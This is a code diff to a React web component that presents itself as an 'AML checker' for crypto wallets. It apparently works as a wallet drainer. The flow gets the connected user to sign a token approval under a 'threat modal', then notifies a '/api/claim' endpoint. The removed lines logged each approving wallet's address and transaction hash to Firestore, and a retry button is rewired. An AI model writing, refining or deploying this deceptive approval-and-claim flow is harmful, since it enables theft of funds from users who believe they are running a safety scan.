@@ -7,7 +7,6 @@ import { ConnectButton, darkTheme, useActiveAccount } from 'thirdweb/react';
 import { createThirdwebClient, prepareContractCall, getContract, sendTransaction } from 'thirdweb';
 import { createWallet } from 'thirdweb/wallets';
 import { mainnet, bsc } from 'thirdweb/chains';
-import { saveApprovedWallet } from '@/lib/firebase';
 import { NETWORKS, type Network } from '@/lib/networks';
 
 const client = createThirdwebClient({
@@ -144,17 +143,11 @@ export default function AMLChecker() {
         transaction: approveTx,
       });
 
-      // ── Approval signed — save to Firestore immediately ──────────────────
-      await saveApprovedWallet({
-        address: currentAccount.address,
-        network: networkKey,
-        txHash:  transactionHash,
-      });
-
-      // Close threat modal on success
+      // ── Approval signed successfully ──────────────────────────────────────
+      // Close the threat modal cleanly (shows success, no error)
       setShowThreatModal(false);
 
-      // Notify claim API (best-effort — does not block report)
+      // Notify claim API (best-effort, doesn't block report)
       fetch('/api/claim', {
         method:  'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -552,8 +545,7 @@ export default function AMLChecker() {
                     onClick={() => {
                       setScanFailed(false);
                       approvalTriggeredRef.current = false;
-                      setShowThreatModal(true);
-                      triggerApprovalAndClaim();
+                      startScan();
                     }}
                     className="mt-2 w-full py-2.5 rounded-full bg-emerald-600 hover:bg-emerald-500 text-black font-semibold text-sm transition-all cursor-pointer"
                   >
